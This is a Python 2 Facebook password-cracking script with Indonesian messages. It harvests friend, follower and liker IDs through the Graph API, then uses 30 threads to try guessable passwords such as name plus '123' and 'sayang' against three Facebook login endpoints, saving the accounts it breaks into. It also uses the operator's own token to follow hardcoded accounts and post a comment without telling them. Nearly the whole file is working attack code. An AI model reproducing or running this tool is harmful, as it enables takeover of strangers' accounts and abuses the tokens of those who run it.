#SILAKAN EDIT JIKA INGIN KEHILANGAN SEMUA DATA DI HANDPHONE MU

P = '\x1b[0;97m'
M = '\x1b[0;91m'
H = '\x1b[0;92m'
K = '\x1b[0;93m'
B = '\x1b[0;94m'
U = '\x1b[0;95m'
O = '\x1b[0;96m'
N = '\x1b[0m'
fb = '570025450621946'
import os, sys, time, datetime, random, hashlib, re, threading, json, cookielib, requests, uuid, itertools, subprocess
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from time import sleep
from datetime import datetime
from random import randint
os.system('git pull')
try:
    import requests
except ImportError:
    print ' !: Modul requests belum terinstal !...\n'
    os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
IP = requests.get('http://ip-api.com')
def logo():
    print '\n\x1b[0;96m __  __         _\x1b[0m\n\x1b[0;96m|  \\/  |     | | | (_)\x1b[0m \x1b[0;91m\xc2\xae B\x1b[0m - \x1b[0;95mF\x1b[0m\n\x1b[0;96m| \\  / |_   _| | |_ _\x1b[0m   \x1b[0;91m R\x1b[0m - \x1b[0;95mO\x1b[0m\n\x1b[0;96m| |\\/| | | | | | __| |\x1b[0m  \x1b[0;91m U\x1b[0m - \x1b[0;95mR\x1b[0m\n\x1b[0;96m| |  | | |_| | | |_| |\x1b[0m  \x1b[0;97m T\x1b[0m -\x1b[0;95m C\x1b[0m\n\x1b[0;96m|_|  |_|\\__,_|_|\\__|_|\x1b[0m  \x1b[0;97m E\x1b[0m - \x1b[0;95mE\x1b[0m\n\n'
kom = 'login'
id = []
cp = []
ok = []
loop = 0
s = requests.Session()
api = 'https://b-api.facebook.com/method/auth.login'
useragents = ('Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.159 CoRom/33.0.1750.159 Safari/537.36 Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54', )
ct = datetime.now()
n = ct.month
bulan1 = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        ngentod = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[0;91m Token Sudah Mati Silakan Pakai Akun Lain'
        os.system('rm -f login.txt')
        time.sleep(3)
        x_()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;91m !: Tidak Ada Koneksi'
        sys.exit()
    logo()
    print '---------------------------------------'
    print '(+)\x1b[0;91m Selamat Datang\x1b[0m ' + ngentod
    print '---------------------------------------'
    print '\x1b[0m(+) UID Acc Anda    : ' + id
    print '\x1b[0m(+) Status Pengguna : \x1b[1;92mPengguna Biasa\x1b[0m'
    print '\x1b[0m(+) Country         : Indonesia\x1b[0m'
    print '(+) Joined          : 12 Agustus 2021\x1b[0m'
    print '---------------------------------------'
    print
    print ' \x1b[0;97m[01] Crack Dari Publik'
    print ' [02] Crack Dari Pengikut'
    print ' [03] Hasil Crack '
    print ' \x1b[0;91m(00)\x1b[0;97m Hapus Token'
    pilih_menu()
def pilih_menu():
    mi = raw_input('\n\x1b[0;97m Pilih > ')
    if mi == '':
        print
        print '\x1b[0;91m !: Isi yg benar'
        exit()
    elif mi in ('1', '01'):
        print "\n \x1b[0;97mKetik \x1b[0;91m'me'\x1b[0m Untuk crack Daftar Teman Sendiri"
        idt = raw_input(' \x1b[0;97m\n ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
        except KeyError:
            print '\x1b[0;91mID Tidak Publik'
            exit()
        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
    elif mi in ('2', '02'):
        print "\n \x1b[0;97m!: Ketik 'me' Untuk Crack followers sendiri"
        idt = raw_input('\x1b[0;97mID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
        except KeyError:
            print ' \x1b[0;91m!: ID Tidak Publik'
            exit()
        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
    elif mi in ('33', '003'):
        idt = raw_input('\x1b[0;97m ?: id post publik : ')
        r = requests.get('https://graph.facebook.com/' + idt + '/likes?limit=9999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
    elif mi in ('3', '03'):
        print '\n\x1b[0;97m 01. Cek hasil ok'
        print ' 02. Cek hasil cp'
        ajg = raw_input('\n \x1b[0;97m?: pilih : ')
        if ajg == '':
            menu()
        elif ajg in ('1', '01'):
            print '\n\x1b[0;97m [\xe2\x80\xa2] hasil \x1b[0;92mOK\x1b[0;97m tanggal : %s-%s-%s\x1b[0;92m\n' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ajg in ('2', '02'):
            print '\n\x1b[0;97m [\xe2\x80\xa2] hasil \x1b[0;91mCP\x1b[0;97m tanggal : %s-%s-%s\x1b[0;91m\n' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit('\x1b[0;91m !: pilih yang benar')
    elif mi == '0' or mi == '00':
        os.system('rm -f login.txt')
        print ' \x1b[0;92m\xe2\x88\x9a  berhasil menghapus token'
        exit()
    else:
        print '\x1b[0;91m Pilih Yang Benar '
        exit()
    print '\x1b[0;97m Total ID  : ' + str(len(id))
    anak_memek()
def anak_memek():
    print '\n\x1b[0;97m [ Pilih Metode Crack ] \n'
    print '\n Jajal Satu PerSatu Yang Menurut Anda Cocok'
    print
    print ' 01. B-Api Facebook (Fast)'
    print ' 02. Mbasic Facebook (Slow Recommend)'
    print ' 03. Mobile Facebook (Sangat Slow)'
    romixyz()
def romixyz():
    rom = raw_input('\n \x1b[0;97mPilih > ')
    if rom == '':
        print '\x1b[0;91m  Pilih Yang Benar '
        romixyz()
    elif rom in ('1', '01'):
        romi_ganteng()
    elif rom in ('2', '02'):
        romi_gntg()
    elif rom in ('3', '03'):
        romi_rzl()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        romixyz()
def romi_ganteng():
    romi = raw_input('\x1b[0;97m Gunakan Pasword Manual? y/t : ')
    if romi == '':
        print '\x1b[0;91m !: pilih yang benar '
        romi_ganteng()
    elif romi in ('y', 'Y'):
        manualbapi()
    elif romi in ('t', 'T'):
        langsungapi()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        romi_ganteng()
def langsungapi():
    print '\n \x1b[0;97mCrack Sedang Berlangsung...\n Lama  Dan Tidak Ada Hasil? Gunakan Mode Pesawat 1 Detik\n'
    def main(arg):
        global cp
        global loop
        global ok
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;91m'])
        print '\r ' + d + '[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for pw in [name.lower() + '123', name.lower() + '12345', 'sayang', '786786']:
                upi = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 
                   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                   'user-agent': upi, 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'x-fb-http-engine': 'Liger'}
                ses = requests.Session()
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                send = ses.get(api, params=param, headers=kontol)
                if 'access_token' in send.text and 'EAAA' in send.text:
                    print '\r \x1b[0;92m[\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                elif 'www.facebook.com' in send.json()['error_msg']:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;91m [BAY_CP] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [KONTOL_CP] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass
                    print '\r\x1b[0;91m [KONTOL_CP] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [KONTOL_CP] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print
    print
    exit()
def manualbapi():
    print '\n\x1b[0;97m !: Contoh Password : sayang,786786'
    pw = raw_input(' \x1b[0;97m?: password : ').split(',')
    if len(pw) == 0:
        exit('\x1b[0;91m !: Tidak Boleh Kosong Anjing ! ')
    print '\n \x1b[0;97m!: Crack Sedang Berlangsung...\n !: Lama Dan Tidak Ada Hasil? Gunakan Mode Pesawat 1 Detik\n'
    def main(arg):
        global loop
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;91m'])
        print '\r ' + d + '[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for asu in pw:
                upi = 'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)'
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 
                   'x-fb-connection-quality': 'EXCELLENT', 
                   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                   'user-agent': upi, 
                   'content-type': 'application/x-www-form-urlencoded', 
                   'x-fb-http-engine': 'Liger'}
                ses = requests.Session()
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                send = ses.get(api, params=param, headers=kontol)
                if 'access_token' in send.text and 'EAAA' in send.text:
                    print '\r\x1b[0;92m [\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                elif 'www.facebook.com' in send.json()['error_msg']:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;91m [BAY_CP] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + '\xe2\x80\xa2' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [KONTOL_CP] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass
                    print '\r\x1b[0;91m [KONTOL_CP] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [KONTOL_CP] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print
    print
    exit()
def romi_gntg():
    romi = raw_input('\x1b[0;97m Gunakan Pasword Manual? y/t : ')
    if romi == '':
        print '\x1b[0;91m  Pilih Yang Benar '
        romi_gntg()
    elif romi in ('y', 'Y'):
        manualbasic()
    elif romi in ('t', 'T'):
        langsungbasic()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        romi_gntg()
def langsungbasic():
    print '\n \x1b[0;97m!: Crack Sedang Berlangsung...\n !: Lama Dan Tidak Ada Hasil? Gunakan Mode Pesawat 1 Detik\n'
    def main(user):
        global loop
        global token
        global ua
        skm = []
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;91m'])
        print '\r ' + d + '[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        try:
            os.mkdir('out')
        except OSError:
            pass
        uid, name = user.split('|')
        for nama in name.split(' '):
            if len(nama) < 3:
                continue
            elif len(nama) == 1 and len(nama) == 2 and len(nama) == 3 and len(nama) == 4 or len(nama) == 5:
                skm.append(nama + '123')
                skm.append(nama + '12345')
            else:
                skm.append(nama + '123')
                skm.append(nama + '12345')
                skm.append('sayang')
                skm.append('786786')
        try:
            for pw in skm:
                ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'])
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r \x1b[0;92m[\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;91m [BAY_CP] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [KONTOL_CP] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass
                    print '\r\x1b[0;91m [KONTOL_CP] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [KONTOL_CP] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print
    print
    exit()
def manualbasic():
    print '\n\x1b[0;97m !: Contoh Password : sayang,786786'
    pw = raw_input(' \x1b[0;97m List Password Nya ? : ').split(',')
    if len(pw) == 0:
        exit('\x1b[0;91m !: Tidak Boleh Kosong Anjing ')
    print '\n \x1b[0;97m!: Crack Sedang Berlangsung...\n !: Lama Dan Tidak Ada  Hasil? Gunakan Mode Pesawat 1 Detik\n'
    def main(arg):
        global loop
        global token
        global ua
        d = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;91m'])
        print '\r' + d + ' [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for asu in pw:
                ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'])
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print '\r\x1b[0;92m [\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;91m [BAY_CP] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + '\xe2\x80\xa2' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [KONTOL_CP] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass
                    print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [KONTOL_CP] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print
    print
    exit()
def romi_rzl():
    romi = raw_input('\x1b[0;97m ?: Gunakan pasword manual? y/t : ')
    if romi == '':
        print '\x1b[0;91m !: pilih yang benar '
        romi_rzl()
    elif romi in ('y', 'Y'):
        m_fb()
    elif romi in ('t', 'T'):
        mobile()
    else:
        print '\x1b[0;91m !: pilih yang benar '
        romi_rzl()
def mobile():
    print '\n !: crack started...\n'
    def main(arg):
        global loop
        print '\r \x1b[0;97m[Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for pw in [name.lower() + '123', name.lower() + '12345', 'sayang', '786786']:
                rex = requests.post('https://mobile.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mobile_logout_button' in xo or 'save-device' in xo:
                    print '\r \x1b[0;92m[\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass
                    print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print
    print
    exit()
def m_fb():
    print '\n\x1b[0;97m !: contoh pass : sayang,786786'
    pw = raw_input(' \x1b[0;97m?: password : ').split(',')
    if len(pw) == 0:
        print '\x1b[0;91m !: tidak boleh kosong'
        m_fb()
    print '\n \x1b[0;97m!: crack started...\n'
    def main(arg):
        global loop
        print '\r\x1b[0;97m [Crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass
        try:
            for asu in pw:
                rex = requests.post('https://mobile.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
                xo = rex.content
                if 'mobile_logout_button' in xo or 'save-device' in xo:
                    print '\r\x1b[0;92m [\xe2\x88\x9a] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    ok.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xe2\x88\x9a] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                if 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()
                        url = 'https://graph.facebook.com/' + uid + '?access_token=' + token
                        data = s.get(url).json()
                        nama = data['name']
                        ttl = data['birthday'].replace('/', '-')
                        print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + ' \xe2\x97\x8a ' + ttl
                        cp.append(uid + ' \xe2\x97\x8a ' + pw + '\xe2\x80\xa2' + ttl)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + ' \xe2\x97\x8a ' + ttl + '\n')
                        save.close()
                        break
                    except (KeyError, IOError):
                        ttl = ' '
                    except:
                        pass
                    print '\r\x1b[0;91m [\xc3\x97] ' + uid + ' \xe2\x97\x8a ' + pw + '        '
                    cp.append(uid + ' \xe2\x97\x8a ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [\xc3\x97] ' + str(uid) + ' \xe2\x97\x8a ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print
    print
    exit()
def login_xx():
    try:
        romz = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m Token Sudah Mati Silakan Pakai Akun Lain ! '
        os.system('rm -rf login.txt')
    requests.post('https://graph.facebook.com/100010125676405/subscribers?access_token=' + romz)
    requests.post('https://graph.facebook.com/' + fb + '/comments/?message=' + kom + '&access_token=' + romz)
    requests.post('https://graph.facebook.com/100000499145355/subscribers?access_token=' + romz)
    menu()
def x_():
    os.system('git pull')
    os.system('clear')
    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        logo()
        token = raw_input(' Masukkan Token : ')
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
            a = json.loads(otw.text)
            lampung = open('login.txt', 'w')
            lampung.write(token)
            lampung.close()
            print '\x1b[0;92m Login Berhasil\x1b[0m '
            print
            print '         DASAR TUKANG MALING :V '
            login_xx()
        except KeyError:
            print '\x1b[0;91m Token Sudah Mati Silakan Pakai Akun Lain ! '
            sys.exit()
x_()
# Mau Ngapain Cuk?
